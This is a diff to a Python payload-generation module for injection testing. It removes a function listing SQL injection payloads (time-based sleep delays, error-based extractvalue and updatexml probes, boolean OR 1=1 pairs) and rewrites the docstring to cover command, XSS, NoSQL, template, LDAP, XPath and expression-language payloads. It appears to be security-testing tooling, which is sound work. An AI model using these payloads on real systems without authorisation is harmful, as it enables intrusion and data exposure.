@@ -1,121 +1,27 @@
 #!/usr/bin/env python3
 """
-Payload generation utilities for injection testing.
+Payload generation utilities for non-SQL injection testing.
 
-These are reference implementations providing common injection payloads
-for various vulnerability types. Adapt payloads based on the specific
-application context (database type, OS, framework, etc.).
+These are reference implementations providing common payloads for command,
+XSS, NoSQL, template, LDAP, XPath, and expression-language injections.
+Adapt payloads based on the specific application context (OS, framework, etc.).
 
 Usage:
     from injection_payloads import (
-        get_sqli_payloads,
         get_cmdi_payloads,
         get_xss_payloads,
         get_nosql_payloads,
-        get_ssti_payloads
+        get_ssti_payloads,
+        get_ldap_payloads,
+        get_xpath_payloads,
+        get_el_payloads,
     )
 
-    # Get SQL injection payloads for time-based detection
-    payloads = get_sqli_payloads(detection="time", db_type="mysql")
+    # Get command injection payloads for time-based detection
+    payloads = get_cmdi_payloads(os_type="linux", detection="time")
 """
 
 from typing import List, Dict, Any
-
-
-def get_sqli_payloads(detection: str = "all", db_type: str = "generic") -> List[Dict[str, Any]]:
-    """
-    Get SQL injection payloads.
-
-    Args:
-        detection: Detection type ("time", "error", "boolean", "all")
-        db_type: Database type ("mysql", "postgres", "mssql", "sqlite", "generic")
-
-    Returns:
-        List of payload dictionaries with payload and metadata
-    """
-    payloads = []
-
-    # Time-based payloads
-    time_payloads = {
-        "mysql": [
-            {"payload": "' OR SLEEP(5)--", "delay": 5},
-            {"payload": "' OR SLEEP(5)#", "delay": 5},
-            {"payload": "1' AND SLEEP(5)--", "delay": 5},
-            {"payload": "1; SELECT SLEEP(5)--", "delay": 5},
-        ],
-        "postgres": [
-            {"payload": "'; SELECT pg_sleep(5)--", "delay": 5},
-            {"payload": "' OR pg_sleep(5)--", "delay": 5},
-        ],
-        "mssql": [
-            {"payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
-            {"payload": "' WAITFOR DELAY '0:0:5'--", "delay": 5},
-        ],
-        "sqlite": [
-            {"payload": "' AND 1=randomblob(500000000)--", "delay": 3},
-        ],
-        "generic": [
-            {"payload": "' OR SLEEP(5)--", "delay": 5},
-            {"payload": "'; SELECT pg_sleep(5)--", "delay": 5},
-            {"payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
-        ],
-    }
-
-    # Error-based payloads (database-specific)
-    error_payloads = {
-        "generic": [
-            {"payload": "'", "type": "single_quote"},
-            {"payload": '"', "type": "double_quote"},
-            {"payload": "`", "type": "backtick"},
-            {"payload": "1'1", "type": "syntax_error"},
-            {"payload": "1 AND 1=CONVERT(int,'a')--", "type": "type_conversion"},
-            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
-        ],
-        "sqlite": [
-            {"payload": "'", "type": "single_quote"},
-            {"payload": "' OR '", "type": "unclosed_string"},
-            {"payload": "1' AND '1", "type": "syntax_break"},
-            {"payload": "' UNION SELECT 1--", "type": "union_error"},
-            {"payload": "' ORDER BY 9999--", "type": "order_by_error"},
-            {"payload": "1; SELECT 1", "type": "stacked_query"},
-        ],
-        "mysql": [
-            {"payload": "'", "type": "single_quote"},
-            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
-            {"payload": "' AND updatexml(1,concat(0x7e,version()),1)--", "type": "updatexml"},
-        ],
-        "postgres": [
-            {"payload": "'", "type": "single_quote"},
-            {"payload": "' AND 1=CAST('a' AS INTEGER)--", "type": "cast_error"},
-        ],
-    }
-
-    # Boolean-based payloads
-    boolean_payloads = [
-        {"true_payload": "' OR '1'='1", "false_payload": "' OR '1'='2"},
-        {"true_payload": "' OR 1=1--", "false_payload": "' OR 1=2--"},
-        {"true_payload": "1 OR 1=1", "false_payload": "1 AND 1=2"},
-        {"true_payload": "' OR 'a'='a", "false_payload": "' OR 'a'='b"},
-        # SQLite-friendly (no comments needed)
-        {"true_payload": "1' OR '1'='1", "false_payload": "1' AND '1'='2"},
-        {"true_payload": "' OR 1=1 OR '1'='1", "false_payload": "' AND 1=2 AND '1'='1"},
-    ]
-
-    if detection in ["time", "all"]:
-        db_payloads = time_payloads.get(db_type, time_payloads["generic"])
-        for p in db_payloads:
-            payloads.append({"type": "time", "db": db_type, **p})
-
-    if detection in ["error", "all"]:
-        db_error_payloads = error_payloads.get(db_type, error_payloads["generic"])
-        for p in db_error_payloads:
-            payloads.append({"type": "error", "db": db_type, **p})
-
-    if detection in ["boolean", "all"]:
-        for p in boolean_payloads:
-            payloads.append({"type": "boolean", **p})
-
-    return payloads
 
 
 def get_cmdi_payloads(os_type: str = "linux", detection: str = "time") -> List[Dict[str, Any]]:
